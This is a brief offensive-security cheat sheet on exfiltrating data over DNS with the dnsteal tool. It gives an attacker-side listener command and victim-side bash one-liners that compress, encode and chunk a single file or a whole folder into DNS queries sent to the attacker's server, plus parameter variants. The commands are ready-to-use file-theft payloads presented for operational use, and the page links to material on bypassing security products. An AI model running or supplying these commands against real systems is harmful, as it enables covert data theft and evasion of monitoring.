# ⭕ DNS

## <mark style="color:red;">dnsteal</mark>

{% embed url="https://github.com/m57/dnsteal.git" %}

```
git clone https://github.com/m57/dnsteal.git
```

#### attacker side:

```
python dnsteal.py 0.0.0.0 -z -v 
```

#### victim side

#### for one file transfer:

```
f=file.txt; s=4;b=57;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do dig @0.0.0.0 `echo -ne $r$f|tr "+" "*"` +short; done
```

#### for a folder ( have to be in the folder you want to download and there should be no sub folders in it just files):

```
for f in $(ls .); do s=4;b=57;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do dig @0.0.0.0 `echo -ne $r$f|tr "+" "*"` +short; done ; done
```

This one would send 45 bytes per subdomain, of which there are 4 in the query. 15 bytes reserved for filename at the end.

```
python dnsteal.py 127.0.0.1 -z -v -b 45 -s 4 -f 15
```

This one would leave no space for filename.

```
python dnsteal.py 127.0.0.1 -z -v -b 63 -s 4 -f 0
```

{% embed url="https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration" %}
